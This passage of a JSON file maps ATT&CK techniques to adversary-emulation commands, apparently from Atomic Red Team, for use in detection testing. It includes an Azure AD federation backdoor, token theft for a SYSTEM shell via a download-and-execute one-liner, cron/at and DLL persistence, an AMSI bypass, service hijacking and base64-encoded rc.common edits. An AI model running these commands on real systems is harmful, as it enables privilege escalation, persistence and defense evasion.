            "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n",
            "command": "Import-Module AzureAD; Import-Module AADInternals; $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword; try {;   Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null; }; catch {;   Write-Host \"Error: AzureAD could not connect\";   exit 1; }; try {;   $domain = Get-AzureADDomain -Name \"contoso.com\"; }; catch {;   Write-Host \"Error: domain \"\"contoso.com\"\" not found\";   exit 1; }; if (-Not $domain.IsVerified) {;   Write-Host \"Error: domain \"\"contoso.com\"\" not verified\";   exit 1; }; if ($domain.AuthenticationType -eq \"Federated\") {;   Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\";   exit 1; }; $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential; if (-Not $at) {;   Write-Host \"Error: AADInternals could not connect\";   exit 1; }; $new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"; if ($new) {;   Write-Host \"Federation successfully added to Azure AD\";   Write-Host $new; }; else {;   Write-Host \"The federation setup failed\"; }; Write-Host \"End of federation configuration.\""
         }
      ]
   },
   "T1134.002": {
      "technique_name": "Create Process with Token",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n",
            "command": "Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}; & \"C:\\Users\\puma-4\\Desktop\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")"
         },
         {
            "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem"
         }
      ]
   },
   "T1546.005": {
      "technique_name": "Event Triggered Execution: Trap",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
            "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'"
         },
         {
            "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
            "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'"
         }
      ]
   },
   "T1053.003": {
      "technique_name": "Scheduled Task/Job: Cron",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n",
            "command": "crontab -l > /tmp/notevil; echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil"
         },
         {
            "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
            "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" >> /var/spool/cron/crontabs/persistevil"
         },
         {
            "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
            "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil"
         }
      ]
   },
   "T1053.002": {
      "technique_name": "Scheduled Task/Job: At",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n",
            "command": "at 13:20 /interactive cmd"
         },
         {
            "description": "This test submits a command to be run in the future by the `at` daemon.\n",
            "command": "echo \"echo Hello from Atomic Red Team\" | at now + 1 minute"
         }
      ]
   },
   "T1547": {
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Install a driver via pnputil.exe lolbin\n",
            "command": "pnputil.exe /add-driver \"C:\\Windows\\INF\\usbstor.inf\""
         }
      ]
   },
   "T1547.012": {
      "technique_name": "Boot or Logon Autostart Execution: Print Processors",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors.\nThe new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\\Users\\Public\\ as validation that the test is successful.\n\nNote: The test assumes a x64 Windows operating system.\n\nThe payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n",
            "command": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}; net stop spooler; Copy-Item \"C:\\Users\\puma-4\\Desktop\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll; reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f; net start spooler;"
         }
      ]
   },
   "T1574.001": {
      "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n",
            "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe && copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll && %APPDATA%\\updater.exe -Command exit"
         }
      ]
   },
   "T1546.009": {
      "technique_name": "Event Triggered Execution: AppCert DLLs",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n",
            "command": "Copy-Item \"7e8ee7_AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll -Force; reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; if($false){Restart-Computer}"
         }
      ]
   },
   "T1574.011": {
      "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n",
            "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL; get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL"
         },
         {
            "description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
            "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\" /f /v ImagePath /d \"%windir%\\system32\\cmd.exe\""
         }
      ]
   },
   "T1037.004": {
      "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n",
            "command": "sudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common"
         },
         {
            "description": "Modify rc.common\n",
            "command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common; sudo chmod +x /etc/rc.common"
         },
         {
            "description": "Modify rc.local\n",
            "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local; sudo chmod +x /etc/rc.local"
         }
      ]
   }
}